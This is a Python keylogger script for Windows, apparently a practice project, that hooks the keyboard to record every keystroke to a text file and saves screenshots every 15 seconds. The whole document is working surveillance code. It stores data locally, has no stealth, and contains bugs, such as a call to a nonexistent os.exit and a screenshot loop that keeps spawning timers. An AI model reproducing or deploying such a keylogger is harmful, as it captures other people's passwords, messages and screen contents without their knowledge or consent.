import pyHook
import pythoncom
from datetime import *
import time
import os

import threading
import pyscreenshot

root_dir=os.path.split(os.path.realpath(__file__))[0]
log_file = os.path.join("C:\\Users\\Solid\\Desktop\\PRACTICE","log_file.txt")
caps_dir = os.path.join(root_dir,"screencaps")
name="keylog"

buffer=""
pause_period=2
last_press = datetime.now()
pause_delta = timedelta(seconds=pause_period)
cap_period =15
log_semaphore = threading.Semaphore()


wait_seconds = 4
timeout = time.time() + wait_seconds
def TimeOut():
    global timeout
    if time.time() > timeout:
        return True
    else:
        return False

def log(message):
    if(len(message)>0):
        log_semaphore.acquire()
        with open(log_file,"a") as f:
            f.write("{}:\t{}\n".format(datetime.now(),message))
            print("{}:\t{}\n".format(datetime.now(),message))
        log_semaphore.release()
def keypress(event):
    global buffer,last_press
    if event.Ascii:
        char = chr(event.Ascii)
        if char=="~":
            
            log("---PROGRAM ENDED---")
            os.exit(1)
        pause = datetime.now()-last_press
        #if pause>= pause_delta:
            
            #buffer=""
        if(event.Ascii==13):
            buffer+="<ENTER>"
        elif event.Ascii==8:
            buffer+="<BACKSPACE>"
        elif event.Ascii==9:
            buffer+="<TAB>"
        else:
            buffer+=char
        #log(buffer)
        log(buffer)
        last_log=datetime.now()
    return True

def screenshot():
    if not os.path.exists(caps_dir):
        os.makedirs(caps_dir)
    filename = os.path.join(caps_dir,"screen"+datetime.now().strftime(("%Y_%m_%d_%H_%M_%S")+".png"))
    pyscreenshot.grab_to_file(filename)
    log("---Screenshot taken: saved to {}---".format(filename))
    threading.Timer(cap_period, screenshot).start()
hm = pyHook.HookManager()
hm.KeyDown = keypress
hm.HookKeyboard()
keylog = threading.Thread(target=pythoncom.PumpMessages)
log("---PROGRAM STARTED")
while True:
    timeout = time.time() + wait_seconds
    screenshot()
keylog.run()
